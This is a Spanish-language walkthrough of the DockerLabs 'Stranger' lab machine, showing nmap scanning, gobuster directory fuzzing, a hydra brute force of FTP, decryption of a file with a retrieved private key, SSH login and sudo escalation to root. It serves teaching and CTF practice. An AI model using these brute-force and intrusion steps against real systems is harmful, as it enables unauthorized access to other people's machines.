# Máquina Stranger

Dificultad -> Medium

Enlace a la máquina -> [Dockerlabs](https://dockerlabs.es/)

Creador -> **kaikoperez**

--------------
## Reconocimiento

Comenzamos realizando un escaneo general con **nmap** sobre la IP de la máquina víctima para ver que puertos tiene abiertos.

```shell
nmap -p- --open -sT --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
________________________________________________
PORT   STATE SERVICE REASON
21/tcp open  ftp     syn-ack
22/tcp open  ssh     syn-ack
80/tcp open  http    syn-ack

```

Lanzamos un conjunto de scripts predeterminado con **nmap** para que nos reporte más información relacionada a los puertos descubiertos en el anterior escaneo.

```shell
nmap -sCV -p21,22,80 172.17.0.2 -oN targeted
________________________________________________
21/tcp open  ftp     vsftpd 2.0.8 or later
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 f6af0177e8fca495856b5c9cc7c1d398 (ECDSA)
|_  256 367ed325fa59388f2e21f9f028a47e44 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-server-header: Apache/2.4.58 (Ubuntu)
|_http-title: welcome
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

Echamos un vistazo a la web:

![Pasted image 20240505223847](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/18feea65-b665-45bf-8ab8-431f30a9be52)

--------------
## Explotación

Tenemos un posible user. 
Hacemos fuerza bruta con el user **mwheeler** al servicio **ftp** y **ssh** pero no tiene resultado.

Aplicamos **fuzzing** en la web:

```shell
gobuster dir -u http://172.17.0.2/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,txt,html,php.bak
-----------------------------------------------------------------------------------
/index.html           (Status: 200) [Size: 231]
/strange              (Status: 301) [Size: 310] [--> http://172.17.0.2/strange/]
/server-status        (Status: 403) [Size: 275]   
```

Encontramos un directorio **/strange**. Accedemos a él en la web y nos encontramos con un **blog**.

![Pasted image 20240505224932](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/50229b47-8448-48ee-8df8-4bff1e1fc852)

Volvemos a aplicar **fuzzing** sobre este directorio:

```shell
gobuster dir -u http://172.17.0.2/strange/ -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x php,txt,html,php.bak
-----------------------------------------------------------------------------------
/index.html           (Status: 200) [Size: 3040]
/private.txt          (Status: 200) [Size: 64]  
/secret.html          (Status: 200) [Size: 172]  
```

Dentro del **secret.html** encontramos una pista:

![Pasted image 20240505225116](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/a7ebe597-a439-44ca-8cea-3692f9759978)

Tenemos también un **private.txt** que nos descargamos de la web.

Aplicamos fuerza bruta con ese user al **FTP**:

```shell
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://172.17.0.2 -t 10
----------------------------------------------------------
[21][ftp] host: 172.17.0.2   login: admin   password: banana
```

Accedemos con las credenciales **admin:banana** por **ftp**:

```shell
ftp 172.17.0.2
-> admin
-> banana

ls
------------------------------------------------------------------------
-rwxr-xr-x    1 0        0             522 May 01 00:53 private_key.pem
```

```shell
get ftp 172.17.0.2
```

![Pasted image 20240505225607](https://github.com/albertomarcostic/DockerLabs-WriteUps/assets/131155486/3516e998-c7a0-4e9c-a675-d801b4b30a8f)

Es posible que con un fichero **pem** y el **txt** tengamos que desencriptar algo.

```shell
sudo openssl rsautl -decrypt -in private.txt -out output.txt -inkey private_key.pem
```

Parece que hemos obtenido una contraseña:

```shell
cat output.txt
-----------------------
demogorgon
```

Resulta ser la contraseña del usuario **mwheeler** por **ssh**:

```shell
ssh mwheeler@172.17.0.2
```

Estamos dentro !

------------------------------
## Escalada de privilegios

El usuario **admin** existe en el sistema. Y al reutilizar la contraseña **banana** podemos migrar a este.

```shell
su admin
```

```shell
sudo -l
----------------------
User admin may run the following commands on a4c4930a7009:
    (ALL) ALL
```

Además, el user **admin** puede ejecutar cualquier cosa como **root**, por lo que podemos escalar privilegios fácilmente.

```shell
sudo su
---------------------------------------
---------------------------------------
root@a4c4930a7009:~# cat flag.txt 
This is the root flat - ##### -
```

